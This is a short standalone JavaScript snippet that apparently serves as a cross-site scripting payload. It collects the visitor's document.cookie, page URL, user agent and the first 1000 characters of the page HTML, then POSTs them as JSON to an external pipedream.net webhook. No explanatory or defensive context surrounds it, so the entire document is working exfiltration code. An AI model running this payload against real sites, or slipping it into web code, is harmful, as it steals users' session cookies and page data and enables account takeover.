fetch("https://236fb3a628ae3f3aef9dc3bd171c41c6.m.pipedream.net", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    cookie: document.cookie,
    location: location.href,
    userAgent: navigator.userAgent,
    html: document.documentElement?.outerHTML?.slice(0, 1000),
    ts: Date.now(),
    id: Math.random().toString(36).substring(2)
  })
});
